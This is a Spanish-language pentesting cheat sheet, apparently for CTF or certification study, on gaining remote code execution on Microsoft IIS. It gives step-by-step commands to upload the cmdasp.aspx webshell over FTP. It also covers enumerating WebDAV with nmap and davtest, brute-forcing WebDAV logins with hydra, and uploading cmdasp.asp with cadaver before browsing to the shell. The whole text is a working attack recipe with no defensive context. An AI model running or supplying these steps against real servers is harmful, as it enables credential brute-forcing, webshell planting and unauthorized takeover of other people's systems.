Microsoft IIS

Microsoft IIS desde FTP (RCE)

Subir cmdasp.aspx por FTP

cp /usr/share/webshells/aspx/cmdasp.aspx .
ftp <ip_target>
put cmdasp.aspx

Apuntar al RCE

# En el sistema se almacena en C:/inetpub/wwwroot
http://<url>/cmdasp.aspx

Microsoft IIS desde WebDAV (RCE)

Enumerar WebDAV

nmap -sCV -p 80 --script http-enum <ip_target>

davtest

davtest -url http://<url>/webdav # Sin credenciales
davtest -auth <user>:<pass> -url http://<url>/webdav # Con credenciales

Fuerza bruta

hydra -L <users.txt> -P <pass.txt> <ip_target> http-get /webdav/

Preparar webshell ASP

cp /usr/share/webshells/asp/cmdasp.asp .

cadaver

cadaver http://<url>/webdav
<user:password>
put cmdasp.asp

Apuntar al RCE

# En el sistema se almacena en C:/inetpub/wwwroot
http://<url>/cmdasp.asp
